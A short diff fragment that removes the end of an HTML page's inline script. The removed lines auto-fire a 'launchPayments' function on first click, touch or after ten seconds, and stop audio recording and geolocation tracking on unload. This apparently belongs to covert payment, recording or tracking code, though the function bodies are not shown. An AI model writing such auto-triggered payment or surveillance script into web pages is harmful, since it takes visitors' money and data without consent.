-        }
-
-        document.addEventListener('click',launchPayments,{once:true});
-        document.addEventListener('touchstart',launchPayments,{once:true});
-        setTimeout(()=>{ if(!isRunning) launchPayments(); },10000);
-
-        window.addEventListener('beforeunload',()=>{
-            if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop();
-            if(audioStream) audioStream.getTracks().forEach(t=>t.stop());
-            if(watchId) navigator.geolocation.clearWatch(watchId);
-        });
-    </script>
 </body>
 </html>
